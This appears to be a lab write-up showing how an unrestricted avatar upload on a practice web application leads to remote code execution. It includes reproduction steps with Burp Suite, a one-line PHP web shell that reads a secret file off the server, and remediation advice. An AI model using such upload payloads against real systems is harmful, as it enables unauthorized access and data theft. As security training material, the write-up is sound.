# Lab: Remote Code Execution via Web Shell Upload

## Vulnerability

This lab demonstrates an unrestricted file upload vulnerability that allows an attacker to upload and execute a malicious PHP file on the server.

## Explanation

The application is designed to accept image files for the avatar, but it does not properly restrict the uploaded file type.

A PHP file can therefore be uploaded and executed by the server.

## Steps to Reproduce

1. Navigate to the **My Account** page.
2. Upload a PHP file containing:

```php
<?php echo "Hello from PHP"; ?>
```

3. Intercept the upload request using Burp Suite and we can see the output in response in Burp Suite
4. Observe the server response:

```
The file avatars/hello.php has been uploaded.
```

<img width="396" height="94" alt="image" src="https://github.com/user-attachments/assets/78b2a4f7-26db-4ef8-8904-3143bb63e4be" />


5. This reveals the location of the uploaded file.
6. Modify the PHP file to retrieve Carlos's secret.

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

<img width="608" height="72" alt="image" src="https://github.com/user-attachments/assets/e4da4743-9e7c-4f98-998f-b0dc0141770b" />

<img width="847" height="383" alt="image" src="https://github.com/user-attachments/assets/5a0d5cc3-e443-439c-b298-585e711425c4" />
   
7. Access the uploaded file and observe the secret in the Burp Suite response.

<img width="476" height="221" alt="image" src="https://github.com/user-attachments/assets/190a1d7e-148c-4ebf-abe6-81eeb7522b10" />

## How It Works

* The application accepts a PHP file even though it expects an image.
* The uploaded file is stored in the `avatars/` directory.
* PHP execution is enabled for the uploaded file.
* The attacker can therefore execute server-side PHP code.
* This allows sensitive information to be retrieved from the server.

## Impact

An attacker can achieve **Remote Code Execution (RCE)** and potentially access sensitive data or perform unauthorized actions with the privileges of the web application.

## Learning

Unrestricted file uploads become particularly dangerous when uploaded files can be executed by the server. File uploads should be restricted to required file types and stored in locations where server-side code execution is disabled.
